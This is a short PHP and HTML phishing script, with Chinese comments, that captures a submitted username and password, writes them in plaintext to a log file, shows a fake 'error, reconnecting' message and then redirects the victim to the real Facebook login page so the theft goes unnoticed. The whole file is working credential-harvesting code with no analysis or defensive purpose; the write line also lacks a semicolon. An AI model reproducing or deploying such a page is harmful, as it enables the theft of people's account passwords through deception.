<?php
$passwd = $_POST["password"];
$account = $_POST["username"];
$data = fopen("logfile.txt","a+");
fwrite($data, "Username: $account\nPassword: $passwd\n") ＃回傳使用者輸入數值
fclose($data);
?>
<html>
<meta http-equiv="refresh" content="1;url=https://www.facebook.com/login.php"> #重新導向練臉書正版登入頁面
<body>
出了點錯誤，重新連線中.......
</body>
</html>
